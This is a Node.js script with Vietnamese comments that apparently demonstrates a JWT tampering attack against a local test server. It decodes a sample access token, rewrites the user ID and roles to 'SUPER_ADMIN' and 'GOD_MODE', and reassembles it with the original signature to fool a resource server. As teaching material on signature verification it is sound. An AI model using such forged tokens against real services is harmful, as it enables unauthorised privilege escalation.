// Thay chuỗi này bằng access_token hợp lệ mà bạn vừa lấy được từ lệnh curl ban nãy
const originalToken = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InJzYS0yMDI2LTA2LXByaW1hcnkifQ.eyJzdWIiOiJ1c2VyX0FUMjAwMzU4Iiwicm9sZXMiOlsiQURNSU4iXSwiaWF0IjoxNzgwODIyMzQwLCJleHAiOjE3ODA4MjMyNDAsImF1ZCI6Im15LXJlc291cmNlLXNlcnZlciIsImlzcyI6Imh0dHA6Ly9sb2NhbGhvc3Q6MzAwMCJ9.MPXEKZdW03LDBG6y-ZsMh5AjhDEAKqh8N5mINkRncQczuC4OJdpDjAvC-jYzHPzD5fAqY7mEdqaPBreIbPb-bokeNMaD31Nbbo8Vxw82vmYItWTl9Tm86YheGg-OTp3kgWwX1ZvKLCQeBttsM0dpsVn44CjFH3DuVMH6cfm39D8JjVhhzWk33EXFQBSpXBsrjjQL459mEGR1zQlYzFdIBhgwqqvmT3PrO552RmpEVYAF7P1BVoWxz7A9UUdvEL86DOD8M1cIpfvH9NdTaDTBN0KbzI55LLf0MVmPkCV7ludH4kG0HGlGNJiW6BJIhlueSi0X746a5xjZcETNrhYmIw";

// 1. Băm token ra làm 3 phần (Header, Payload, Signature)
const parts = originalToken.split('.');

// 2. Giải mã Payload từ Base64URL sang dạng Text (JSON)
const payloadJson = Buffer.from(parts[1], 'base64url').toString('utf8');
const payload = JSON.parse(payloadJson);

console.log("--- PAYLOAD GỐC ---");
console.log(payload);

// 3. HACKER HÀNH ĐỘNG: Sửa đổi dữ liệu
payload.sub = "user_HACKER_999";
payload.roles = ["SUPER_ADMIN", "GOD_MODE"];

console.log("\n--- PAYLOAD ĐÃ BỊ SỬA ---");
console.log(payload);

// 4. Mã hóa Payload mới ngược lại thành Base64URL
const forgedPayloadBase64 = Buffer.from(JSON.stringify(payload)).toString('base64url');

// 5. Lắp ráp lại Token: Header gốc + Payload mới + Chữ ký gốc
const forgedToken = `${parts[0]}.${forgedPayloadBase64}.${parts[2]}`;

console.log("\n--- FORGED TOKEN (Dùng cái này để đi lừa Resource Server) ---");
console.log(forgedToken);